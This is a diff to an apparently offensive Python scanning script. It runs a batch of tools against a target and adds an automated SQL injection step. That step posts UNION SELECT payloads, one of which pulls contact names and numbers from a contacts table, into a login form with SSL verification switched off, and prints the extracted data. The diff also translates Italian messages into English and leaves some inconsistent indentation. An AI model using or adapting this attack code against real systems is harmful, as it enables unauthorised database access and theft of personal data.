@@ -1,8 +1,6 @@
 import subprocess
 import os
 import requests
-import time
-from requests.exceptions import RequestException
 
 def run_command(command):
     """Run a command and return its output."""
@@ -80,27 +78,17 @@ def perform_sql_injection(target_url):
         "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --"
     ]
 
-    max_retries = 3
-    retry_delay = 5  # seconds
-
     for payload in payloads:
         data = {
             'username': f'admin{payload}',
             'password': 'password'  # Update with the correct password field if needed
         }
-
-        attempt = 0
-        while attempt < max_retries:
-            try:
-                response = requests.post(target_url, data=data, verify=False)
-                print(response.text)  # This will display the extracted data, handle it as you wish
-                break  # Exit the retry loop if the request was successful
-            except RequestException as e:
-                print(f"Request failed: {e}. Retrying in {retry_delay} seconds...")
-                attempt += 1
-                time.sleep(retry_delay)
-        else:
-            print(f"Failed to perform SQL injection after {max_retries} attempts.")
+        
+        try:
+            response = requests.post(target_url, data=data, verify=False)  # Disable SSL verification
+            print(response.text)  # This will display the extracted data, handle it as you wish
+        except requests.RequestException as e:
+            print(f"Request failed: {e}")
 
 def main():
     install_tools()
@@ -135,20 +123,24 @@ def main():
     total_tools = len(tools)
     
     for i, (tool_name, command) in enumerate(tools.items(), 1):
-        print(f"Esecuzione di {tool_name} ({i}/{total_tools})...")
+        print(f"Running {tool_name} ({i}/{total_tools})...")
         stdout, stderr = run_command(command)
-        save_to_file(output_file, f"=== Risultati {tool_name} ===\n")
+        save_to_file(output_file, f"=== {tool_name} Results ===\n")
         if stdout:
             save_to_file(output_file, stdout)
         if stderr:
-            save_to_file(output_file, f"Errori:\n{stderr}")
+            save_to_file(output_file, f"Errors:\n{stderr}")
         
         # Calculate and print the progress
         progress = (i / total_tools) * 100
-                print(f"Progress: {progress:.2f}%")
+        print(f"Progress: {progress:.2f}%")
 
-    print("Analisi completata. I risultati sono stati salvati in:", output_file)
+    print("Analysis completed. Results saved in:", output_file)
+
+    # Perform SQL injection
+        # Perform SQL injection tests
+    print(f"Performing SQL Injection test on {link_with_https}")
+    perform_sql_injection(link_with_https)
 
 if __name__ == "__main__":
     main()
-    
